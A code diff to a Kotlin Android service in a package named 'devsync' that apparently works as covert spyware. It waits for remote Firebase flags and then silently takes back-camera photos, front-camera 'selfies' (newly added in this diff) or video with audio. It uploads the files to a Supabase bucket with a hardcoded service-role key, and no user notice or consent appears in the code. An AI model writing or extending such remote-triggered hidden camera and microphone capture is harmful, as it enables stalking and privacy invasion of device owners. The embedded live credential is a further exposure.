@@ -29,7 +29,7 @@ package com.example.devsync
       companion object {
           const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
           const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
-          const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
+          const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
       }
 
       private val deviceId by lazy {
@@ -100,12 +100,23 @@ package com.example.devsync
       }
 
       private fun setupFirebaseListeners() {
-          // Take photo command
+          // Back camera photo
           database.child("take_photo").addValueEventListener(object : ValueEventListener {
               override fun onDataChange(snapshot: DataSnapshot) {
                   if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                       database.child("take_photo").removeValue()
-                      takePhoto()
+                      takePhoto(CameraCharacteristics.LENS_FACING_BACK, "cam")
+                  }
+              }
+              override fun onCancelled(error: DatabaseError) {}
+          })
+
+          // Front camera selfie
+          database.child("take_selfie").addValueEventListener(object : ValueEventListener {
+              override fun onDataChange(snapshot: DataSnapshot) {
+                  if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
+                      database.child("take_selfie").removeValue()
+                      takePhoto(CameraCharacteristics.LENS_FACING_FRONT, "selfie")
                   }
               }
               override fun onCancelled(error: DatabaseError) {}
@@ -115,11 +126,8 @@ package com.example.devsync
           database.child("camera_video_flag").addValueEventListener(object : ValueEventListener {
               override fun onDataChange(snapshot: DataSnapshot) {
                   val enable = snapshot.getValue(Boolean::class.java) ?: false
-                  if (enable && !isRecordingVideo) {
-                      startCameraVideoRecording()
-                  } else if (!enable && isRecordingVideo) {
-                      stopCameraVideoRecording()
-                  }
+                  if (enable && !isRecordingVideo) startCameraVideoRecording()
+                  else if (!enable && isRecordingVideo) stopCameraVideoRecording()
               }
               override fun onCancelled(error: DatabaseError) {}
           })
@@ -127,10 +135,10 @@ package com.example.devsync
 
       // ── Photo Capture ─────────────────────────────────────────────────────────
 
-      private fun takePhoto() {
+      private fun takePhoto(facing: Int, prefix: String) {
           if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
           try {
-              val cameraId = getCameraId(facing = CameraCharacteristics.LENS_FACING_BACK) ?: return
+              val cameraId = getCameraId(facing) ?: getCameraId(CameraCharacteristics.LENS_FACING_BACK) ?: return
               imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
               imageReader!!.setOnImageAvailableListener({ reader ->
                   val image: Image = reader.acquireNextImage() ?: return@setOnImageAvailableListener
@@ -138,7 +146,7 @@ package com.example.devsync
                   val bytes = ByteArray(buffer.remaining())
                   buffer.get(bytes)
                   image.close()
-                  saveAndUploadPhoto(bytes)
+                  saveAndUploadPhoto(bytes, prefix)
                   closeCamera()
               }, backgroundHandler)
 
@@ -175,11 +183,11 @@ package com.example.devsync
           }
       }
 
-      private fun saveAndUploadPhoto(bytes: ByteArray) {
+      private fun saveAndUploadPhoto(bytes: ByteArray, prefix: String) {
           CoroutineScope(Dispatchers.IO).launch {
               try {
                   val ts = System.currentTimeMillis()
-                  val fileName = "cam_${deviceIdShort}_${ts}.jpg"
+                  val fileName = "${prefix}_${deviceIdShort}_${ts}.jpg"
                   val file = File(cacheDir, fileName)
                   FileOutputStream(file).use { it.write(bytes) }
                   uploadToSupabase(file, "photos", fileName, "image/jpeg")
@@ -194,7 +202,7 @@ package com.example.devsync
           if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
           if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
           try {
-              val cameraId = getCameraId(facing = CameraCharacteristics.LENS_FACING_BACK) ?: return
+              val cameraId = getCameraId(CameraCharacteristics.LENS_FACING_BACK) ?: return
               val ts = System.currentTimeMillis()
               val fileName = "camvid_${deviceIdShort}_${ts}.mp4"
               val videoFile = File(cacheDir, fileName)
@@ -223,8 +231,7 @@ package com.example.devsync
                   override fun onOpened(camera: CameraDevice) {
                       cameraOpenCloseLock.release()
                       cameraDevice = camera
-                      val surfaces = listOf(mediaRecorder!!.surface)
-                      camera.createCaptureSession(surfaces,
+                      camera.createCaptureSession(listOf(mediaRecorder!!.surface),
                           object : CameraCaptureSession.StateCallback() {
                               override fun onConfigured(session: CameraCaptureSession) {
                                   cameraCaptureSession = session
@@ -258,21 +265,13 @@ package com.example.devsync
           isRecordingVideo = false
           val fileToUpload = currentVideoFile
           currentVideoFile = null
-          try {
-              cameraCaptureSession?.stopRepeating()
-              mediaRecorder?.stop()
-          } catch (_: Exception) {}
-          mediaRecorder?.reset()
-          mediaRecorder?.release()
-          mediaRecorder = null
+          try { cameraCaptureSession?.stopRepeating(); mediaRecorder?.stop() } catch (_: Exception) {}
+          mediaRecorder?.reset(); mediaRecorder?.release(); mediaRecorder = null
           closeCamera()
           fileToUpload?.let { file ->
               if (file.exists()) {
                   CoroutineScope(Dispatchers.IO).launch {
-                      try {
-                          uploadToSupabase(file, "videos", file.name, "video/mp4")
-                          file.delete()
-                      } catch (_: Exception) {}
+                      try { uploadToSupabase(file, "videos", file.name, "video/mp4"); file.delete() } catch (_: Exception) {}
                   }
               }
           }
@@ -284,8 +283,6 @@ package com.example.devsync
           try { imageReader?.close(); imageReader = null } catch (_: Exception) {}
       }
 
-      // ── Supabase Upload ───────────────────────────────────────────────────────
-
       private fun uploadToSupabase(file: File, bucket: String, fileName: String, mimeType: String) {
           val body = file.readBytes().toRequestBody(mimeType.toMediaTypeOrNull())
           val req = Request.Builder()
@@ -293,20 +290,15 @@ package com.example.devsync
               .header("Authorization", "Bearer $SUPABASE_KEY")
               .header("apikey", SUPABASE_KEY)
               .header("Content-Type", mimeType)
-              .post(body)
-              .build()
+              .post(body).build()
           http.newCall(req).execute().use {}
       }
 
-      // ── Helper ────────────────────────────────────────────────────────────────
-
-      private fun getCameraId(facing: Int): String? {
-          return try {
-              cameraManager.cameraIdList.firstOrNull { id ->
-                  val ch = cameraManager.getCameraCharacteristics(id)
-                  ch.get(CameraCharacteristics.LENS_FACING) == facing
-              }
-          } catch (_: Exception) { null }
-      }
+      private fun getCameraId(facing: Int): String? = try {
+          cameraManager.cameraIdList.firstOrNull { id ->
+              cameraManager.getCameraCharacteristics(id)
+                  .get(CameraCharacteristics.LENS_FACING) == facing
+          }
+      } catch (_: Exception) { null }
   }
   
